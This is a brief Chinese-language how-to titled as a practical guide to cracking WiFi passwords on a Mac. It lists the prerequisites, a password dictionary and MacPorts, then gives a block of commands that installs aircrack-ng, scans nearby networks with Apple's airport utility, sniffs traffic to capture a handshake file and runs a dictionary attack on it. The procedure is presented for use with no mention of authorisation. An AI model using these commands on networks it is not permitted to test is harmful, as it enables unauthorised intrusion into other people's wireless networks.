##Wifi密碼破解實戰-Mac

#事前準備
- 密碼字典
- 安裝MacPorts

#所需指令
```js
sudo port selfupdate
sudo port install aircrack-ng
sudo /System/Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport -s #取得Wifi資訊
sudo /System/Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport en0 sniff #監聽口
sudo aircrack-ng /tmp/終端機會輸出檔案名.cap
cd  ~/你的Wifi/字典路徑
sudo aircrack-ng -w 字典名稱.txt /tmp/終端機會輸出檔案名.cap #破解密碼
```
